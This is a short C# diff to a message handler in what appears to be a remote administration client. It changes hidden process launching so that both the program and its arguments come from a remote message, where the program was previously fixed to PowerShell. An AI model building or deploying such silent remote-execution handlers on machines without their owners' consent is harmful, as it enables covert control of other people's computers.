@@ -33,7 +33,7 @@ namespace Quasar.Client.Messages
             Process process = new Process();
             ProcessStartInfo startInfo = new ProcessStartInfo();
             startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            startInfo.FileName = "powershell.exe";
+            startInfo.FileName = message.Host;
             startInfo.Arguments = message.Command;
             process.StartInfo = startInfo;
             process.Start();
